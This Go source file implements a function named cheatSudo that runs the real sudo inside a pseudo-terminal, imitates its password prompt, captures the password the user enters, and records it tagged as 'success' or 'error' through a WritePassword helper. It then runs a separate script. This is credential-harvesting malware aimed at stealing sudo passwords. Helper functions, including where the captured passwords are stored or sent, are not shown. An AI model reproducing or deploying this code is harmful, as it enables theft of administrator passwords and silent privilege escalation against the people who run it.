package main

import (
	"fmt"
	"github.com/google/goterm/term"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

var failAuthRE = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*：)|(重试)|(错误)|(try again)|( denied)`)
var SudoAskPrefix = regexp.MustCompile(`^\[sudo\]`)
var SudoAskEnd = regexp.MustCompile(`(: $)|(：$)`)

func cheatSudo() {
	var pty, err = term.OpenPTY()
	ExecIfErr(err)
	var password string
	var inputArgs []string

	suCmd := false
	for _, v := range os.Args[1:] {
		if v == "su" {
			suCmd = true
		}
	}
	if suCmd {
		inputArgs = []string{"-S", "-v"}
	} else {
		inputArgs = append([]string{"-S"}, os.Args[1:]...)
	}
	c := exec.Command("sudo", inputArgs...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	err = c.Start()
	ExecIfErr(err)

	var p ptyReader
	p.Reader(pty)
	p.AddRule(SudoAskPrefix, SudoAskEnd)

	var AskPass bool
	go func() {
		defer func() {
			p.ReadLock <- struct{}{}
		}()

		line := p.Readline()
		if !failAuthRE.MatchString(line) || line == "" {
			return
		}
		AskPass = true
		for {
			if p.IsClose() {
				return
			}
			if password != "" && failAuthRE.MatchString(line) {
				WritePassword(password + " error")
				password = ""
			}
			if strings.TrimSpace(line) != "" && password != "" {
				WritePassword(password + " success")
				return
			}

			fmt.Print(line)
			if SudoAskEnd.MatchString(line) && SudoAskPrefix.MatchString(line) {
				password = GetPassword()
				pty.Master.WriteString(password + "\r")
			}
			line = p.Readline()
		}
	}()

	c.Wait()
	if AskPass {
		time.Sleep(time.Second / 2) //适配中文语言Linux环境的bug
	}
	p.Close()

	if suCmd && password != "" {
		WritePassword(password + " success")
	}
	if !AskPass {
		ExecScript(cmd)
	}
	if password != "" {
		ExecScript(cmd)
	}
}
